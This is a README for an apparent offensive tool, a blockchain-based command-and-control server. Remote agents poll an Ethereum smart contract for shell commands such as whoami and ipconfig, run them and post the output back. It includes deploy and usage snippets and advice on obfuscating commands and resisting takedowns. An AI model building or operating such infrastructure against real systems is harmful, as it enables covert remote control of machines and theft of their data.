# Onchain C2 Server

An Ethereum-based Command & Control (C2) server that leverages smart contracts for decentralized command execution and response collection. This innovative approach uses blockchain state to store commands and receive agent responses, making it resilient to traditional infrastructure takedowns.

## Overview

This onchain C2 server pivots from traditional socket-based communication to Ethereum smart contracts, providing:
- **Decentralized Command Distribution**: Commands stored in smart contract state
- **Cryptographic Agent Authentication**: Verify agents via blockchain signatures
- **Immutable Audit Trail**: All commands and responses recorded on-chain
- **Distributed Infrastructure**: No central server to take down

### How It Works

1. **Operator**: Posts commands to a smart contract
2. **Agents**: Monitor the blockchain and execute assigned commands
3. **Agents**: Send responses back to the smart contract
4. **Operator**: Retrieves responses and manages sessions

## Features

- 🔗 Ethereum smart contract-based C2 infrastructure
- 🔐 Cryptographic authentication and verification
- 📊 Decentralized command/response storage
- 🔍 Immutable command history and audit trail
- 💰 Gas-efficient contract interactions
- 🎯 Multi-agent session management
- 🌐 Cross-platform client support
- ⛓️ Web3.py integration for blockchain interaction

## Requirements

- Python 3.8+
- Web3.py library
- Ethereum wallet with testnet/mainnet ETH
- Solidity compiler (for contract deployment)
- Infura or local Ethereum node RPC endpoint

## Installation

```bash
git clone <repository-url>
cd C2_server
pip install web3
```

### Smart Contract Deployment

1. Deploy the C2 smart contract to Ethereum:

```bash
python deploy_contract.py --network goerli --private-key <your-private-key>
```

2. Note the contract address for client configuration

### Configuration

Update `config.py` with your deployment details:

```python
ETHEREUM_RPC = "https://goerli.infura.io/v3/YOUR-PROJECT-ID"
CONTRACT_ADDRESS = "0x..."
CONTRACT_ABI = [...]  # From contract compilation
OPERATOR_PRIVATE_KEY = "0x..."
OPERATOR_ADDRESS = "0x..."
```

## Usage

### Operator: Posting a Command

```python
from c2_operator import C2Operator

operator = C2Operator()

# Post a command for agents
operator.post_command(
    agent_id=1,
    command="whoami",
    gas_price="20 gwei"
)

print("Command posted to blockchain with tx hash: 0x...")
```

### Agent: Executing Commands

```bash
python agent.py --agent-id 1 --private-key 0x...
```

The agent will continuously:
1. Monitor the blockchain for new commands
2. Execute assigned commands locally
3. Submit responses back to the smart contract

### Operator: Retrieving Responses

```python
# Get all responses for an agent
responses = operator.get_agent_responses(agent_id=1)

for response in responses:
    print(f"Timestamp: {response['timestamp']}")
    print(f"Command: {response['command']}")
    print(f"Output: {response['output']}")
```

## Example Workflow

```
Operator Posts Command:
- Navigate to blockchain C2 interface
- Enter command: "ipconfig"
- Select target agent: Agent-1 (0x1234...)
- Confirm transaction

Agent Monitors & Executes:
- Agent 1 detects new command in smart contract
- Executes: ipconfig
- Generates output
- Signs response with private key
- Submits to smart contract

Operator Retrieves Response:
- Queries smart contract for Agent-1 responses
- Validates signature
- Displays output in operator console
```

## Project Structure

```
C2_server/
├── contracts/
│   └── C2Server.sol          # Main smart contract
├── agent.py                  # Agent implementation
├── c2_operator.py            # Operator implementation
├── config.py                 # Configuration file
├── deploy_contract.py        # Contract deployment script
├── main.py                   # Original socket-based server (legacy)
├── client.py                 # Original socket-based client (legacy)
├── README.md                 # Documentation
└── LICENSE                   # MIT License
```

## Smart Contract Architecture

### State Variables
- `mapping(uint => Command[])` → Commands per agent
- `mapping(uint => Response[])` → Responses from agents
- `mapping(address => bool)` → Authorized operators
- `mapping(address => uint)` → Agent registry

### Key Functions
- `postCommand()` → Operator posts command on-chain
- `submitResponse()` → Agent submits command response
- `getCommands()` → Agent retrieves pending commands
- `getResponses()` → Operator retrieves agent responses

## Security Considerations

### Advantages
✅ Decentralized - no single point of failure
✅ Immutable records - commands can't be tampered with
✅ Cryptographic verification - trust the math, not servers
✅ Resilient to takedowns - spread across blockchain nodes

### Limitations & Warnings
⚠️ **On-Chain Visibility**: All commands visible to blockchain observers
⚠️ **Gas Costs**: Every operation costs ETH
⚠️ **Transaction Delays**: Depends on block confirmation times
⚠️ **No Encryption**: Commands visible to network participants
⚠️ **Immutability**: Can't delete accidentally posted commands

### Recommendations
- Use end-to-end encryption BEFORE posting commands on-chain
- Implement command obfuscation techniques
- Use private/sidechain for sensitive operations
- Compartmentalize agents by function
- Monitor gas prices before bulk operations
- Implement rate limiting on contract functions

## Gas Optimization Tips

```python
# Batch multiple commands to save gas
operator.batch_post_commands([
    ("whoami", agent1),
    ("ipconfig", agent2),
    ("dir C:\\", agent3),
])

# Use calldata for small responses instead of state
agent.submit_response_calldata(response_hash)
```

## Troubleshooting

### Transaction Fails
- Check sufficient ETH for gas
- Verify RPC endpoint connectivity
- Confirm contract address is correct

### Agent Not Receiving Commands
- Ensure agent is running and monitoring blockchain
- Check agent's Ethereum address is registered
- Verify contract events are emitting correctly

### Slow Response Times
- Network congestion - try again in off-peak hours
- Increase gas price for faster confirmation
- Use Flashbots for MEV protection

## Advanced Features

- **Encrypted Payloads**: Asymmetric encryption before posting
- **Batch Operations**: Multiple commands in single transaction
- **Agent Groups**: Organize agents into operational teams
- **Command Scheduling**: Time-locked command execution
- **Response Aggregation**: Combine responses from multiple agents

## Disclaimer

⚠️ **EDUCATIONAL ONLY**: This onchain C2 is for authorized security testing and educational purposes only. Unauthorized access to computer systems is illegal. The authors assume no liability for misuse.

## License

MIT License - See LICENSE file for details.
